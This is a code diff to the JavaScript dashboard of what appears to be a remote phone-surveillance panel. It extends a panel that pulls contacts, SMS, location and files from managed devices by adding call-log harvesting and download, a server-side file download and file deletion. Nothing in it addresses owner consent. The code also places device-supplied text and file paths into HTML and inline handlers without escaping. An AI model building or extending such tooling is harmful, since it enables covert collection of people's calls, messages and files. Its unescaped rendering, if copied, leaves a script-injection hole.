@@ -20,6 +20,8 @@ class DeviceManager {
         document.getElementById('download-contacts').addEventListener('click', () => this.downloadContacts());
         document.getElementById('request-sms').addEventListener('click', () => this.requestSMS());
         document.getElementById('download-sms').addEventListener('click', () => this.downloadSMS());
+        document.getElementById('request-call-log').addEventListener('click', () => this.requestCallLog());
+        document.getElementById('download-call-log').addEventListener('click', () => this.downloadCallLog());
         document.getElementById('upload-btn').addEventListener('click', () => this.uploadFile());
         document.getElementById('refresh-files').addEventListener('click', () => this.requestFiles());
         document.getElementById('go-back').addEventListener('click', () => this.goBackDirectory());
@@ -138,6 +140,7 @@ class DeviceManager {
             this.initializeMap();
             this.renderContacts();
             this.renderSMS();
+            this.renderCallLog();
             this.renderFiles();
             
         } catch (error) {
@@ -212,6 +215,9 @@ class DeviceManager {
                             <p class="text-xs text-gray-500">
                                 ${contact.phoneNumbers && contact.phoneNumbers.length > 0 ? contact.phoneNumbers[0].number : 'No phone'}
                             </p>
+                            ${contact.emails && contact.emails.length > 0 ? `
+                                <p class="text-xs text-gray-400">${contact.emails[0].email}</p>
+                            ` : ''}
                         </div>
                     </div>
                 </div>
@@ -234,8 +240,17 @@ class DeviceManager {
         const smsList = document.getElementById('sms-list');
         const smsCount = document.getElementById('sms-count');
         
-        if (this.selectedDevice.sms && this.selectedDevice.sms.length > 0) {
-            smsList.innerHTML = this.selectedDevice.sms.map(message => `
+        if (this.selectedDevice.sms?.error) {
+            smsList.innerHTML = `
+                <div class="text-center py-4">
+                    <i class="fas fa-exclamation-triangle text-yellow-500 text-2xl mb-2 block"></i>
+                    <p class="text-sm text-gray-700 mb-2">${this.selectedDevice.sms.error}</p>
+                    <p class="text-xs text-gray-500">SMS access requires native implementation</p>
+                </div>
+            `;
+            smsCount.textContent = 'SMS access not available';
+        } else if (this.selectedDevice.sms?.messages && this.selectedDevice.sms.messages.length > 0) {
+            smsList.innerHTML = this.selectedDevice.sms.messages.map(message => `
                 <div class="flex justify-between items-start py-3 border-b border-gray-200 last:border-b-0">
                     <div class="flex items-start flex-1">
                         <div class="w-8 h-8 ${message.type === 'sent' ? 'bg-blue-100' : 'bg-green-100'} rounded-full flex items-center justify-center mr-3 mt-1">
@@ -252,7 +267,7 @@ class DeviceManager {
                 </div>
             `).join('');
             
-            smsCount.innerHTML = `<i class="fas fa-sms mr-1"></i>${this.selectedDevice.sms.length} messages`;
+            smsCount.innerHTML = `<i class="fas fa-sms mr-1"></i>${this.selectedDevice.sms.messages.length} messages`;
         } else {
             smsList.innerHTML = `
                 <div class="text-center py-4">
@@ -265,6 +280,67 @@ class DeviceManager {
         }
     }
 
+    renderCallLog() {
+        const callLogList = document.getElementById('call-log-list');
+        const callLogCount = document.getElementById('call-log-count');
+        
+        if (this.selectedDevice.callLog && this.selectedDevice.callLog.length > 0) {
+            callLogList.innerHTML = this.selectedDevice.callLog.map(call => `
+                <div class="flex justify-between items-start py-3 border-b border-gray-200 last:border-b-0">
+                    <div class="flex items-start flex-1">
+                        <div class="w-8 h-8 ${this.getCallTypeColor(call.type)} rounded-full flex items-center justify-center mr-3 mt-1">
+                            <i class="fas fa-${this.getCallTypeIcon(call.type)} text-white text-xs"></i>
+                        </div>
+                        <div class="flex-1">
+                            <div class="flex items-center justify-between mb-1">
+                                <p class="text-sm font-medium text-gray-900">${call.name || call.phoneNumber}</p>
+                                <span class="text-xs text-gray-500">${new Date(call.timestamp).toLocaleString()}</span>
+                            </div>
+                            <p class="text-xs text-gray-500">${call.phoneNumber}</p>
+                            <p class="text-xs text-gray-400">
+                                ${call.type} • ${call.duration > 0 ? this.formatDuration(call.duration) : 'No duration'}
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+            
+            callLogCount.innerHTML = `<i class="fas fa-phone mr-1"></i>${this.selectedDevice.callLog.length} calls`;
+        } else {
+            callLogList.innerHTML = `
+                <div class="text-center py-4">
+                    <i class="fas fa-phone text-gray-400 text-2xl mb-2 block"></i>
+                    <p class="text-sm text-gray-500">No call history available</p>
+                    <p class="text-xs text-gray-400">Click "Load Call Log" to fetch history</p>
+                </div>
+            `;
+            callLogCount.textContent = '';
+        }
+    }
+
+    getCallTypeColor(type) {
+        switch (type) {
+            case 'incoming': return 'bg-green-500';
+            case 'outgoing': return 'bg-blue-500';
+            case 'missed': return 'bg-red-500';
+            default: return 'bg-gray-500';
+        }
+    }
+
+    getCallTypeIcon(type) {
+        switch (type) {
+            case 'incoming': return 'phone';
+            case 'outgoing': return 'phone';
+            case 'missed': return 'phone-slash';
+            default: return 'phone';
+        }
+    }
+
+    formatDuration(seconds) {
+        const minutes = Math.floor(seconds / 60);
+        const remainingSeconds = seconds % 60;
+        return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
+    }
     renderFiles() {
         const fileBrowser = document.getElementById('file-browser');
         const currentPath = document.getElementById('current-path');
@@ -272,7 +348,7 @@ class DeviceManager {
         
         if (this.selectedDevice.currentPath) {
             currentPath.textContent = this.selectedDevice.currentPath;
-            goBackBtn.disabled = this.selectedDevice.currentPath === '/storage/emulated/0';
+            goBackBtn.disabled = this.selectedDevice.currentPath === this.selectedDevice.currentPath.split('/').slice(0, -1).join('/');
         }
         
         if (this.selectedDevice.files && this.selectedDevice.files.length > 0) {
@@ -291,16 +367,17 @@ class DeviceManager {
                                 </div>
                             </div>
                             <div class="flex items-center space-x-2">
+                                <button onclick="event.stopPropagation(); deviceManager.downloadFile('${file.path}')" class="text-blue-600 hover:text-blue-700 p-1" title="Download">
+                                    <i class="fas fa-download"></i>
+                                </button>
                                 ${file.type !== 'folder' ? `
-                                    <button onclick="event.stopPropagation(); deviceManager.downloadFile('${file.path}')" class="text-blue-600 hover:text-blue-700 p-1">
-                                        <i class="fas fa-download"></i>
-                                    </button>
-                                    <button onclick="event.stopPropagation(); deviceManager.deleteFile('${file.path}')" class="text-red-600 hover:text-red-700 p-1">
+                                    <button onclick="event.stopPropagation(); deviceManager.deleteFile('${file.path}')" class="text-red-600 hover:text-red-700 p-1" title="Delete">
                                         <i class="fas fa-trash"></i>
                                     </button>
-                                ` : `
+                                ` : ''}
+                                ${file.type === 'folder' ? `
                                     <i class="fas fa-chevron-right text-gray-400"></i>
-                                `}
+                                ` : ''}
                             </div>
                         </div>
                     `).join('')}
@@ -388,8 +465,28 @@ class DeviceManager {
     }
 
     downloadFile(filePath) {
-        // In a real implementation, this would download the file from the device
-        alert(`Download functionality for ${filePath} would be implemented here`);
+        if (!this.selectedDevice.isOnline) {
+            alert('Device is offline. Cannot download file.');
+            return;
+        }
+        
+        fetch(`/api/devices/${this.selectedDevice.id}/download-file`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ filePath })
+        })
+        .then(response => response.json())
+        .then(result => {
+            if (result.success) {
+                alert('File download request sent. Check server logs for file content.');
+            } else {
+                alert('Failed to request file download');
+            }
+        })
+        .catch(error => {
+            console.error('Error requesting file download:', error);
+            alert('Failed to request file download');
+        });
     }
 
     deleteFile(filePath) {
@@ -444,6 +541,50 @@ class DeviceManager {
         }
     }
 
+    async requestCallLog() {
+        try {
+            const response = await fetch(`/api/devices/${this.selectedDevice.id}/request-call-log`, {
+                method: 'POST'
+            });
+            const result = await response.json();
+            
+            if (result.success) {
+                // Show loading state
+                document.getElementById('call-log-list').innerHTML = `
+                    <div class="text-center py-4">
+                        <i class="fas fa-spinner fa-spin text-green-600 text-2xl mb-2 block"></i>
+                        <p class="text-sm text-gray-500">Loading call history from device...</p>
+                    </div>
+                `;
+                
+                // Refresh device data after a short delay
+                setTimeout(() => this.openDeviceModal(this.selectedDevice.id), 3000);
+            }
+        } catch (error) {
+            console.error('Error requesting call log:', error);
+            alert('Failed to request call log');
+        }
+    }
+
+    async downloadCallLog() {
+        try {
+            const response = await fetch(`/api/devices/${this.selectedDevice.id}/call-log/download`);
+            const blob = await response.blob();
+            
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = url;
+            a.download = `call-log-${this.selectedDevice.deviceName.replace(/[^a-zA-Z0-9]/g, '_')}-${new Date().toISOString().split('T')[0]}.json`;
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+            document.body.removeChild(a);
+        } catch (error) {
+            console.error('Error downloading call log:', error);
+            alert('Failed to download call log');
+        }
+    }
     async requestLocation() {
         try {
             const response = await fetch(`/api/devices/${this.selectedDevice.id}/request-location`, {
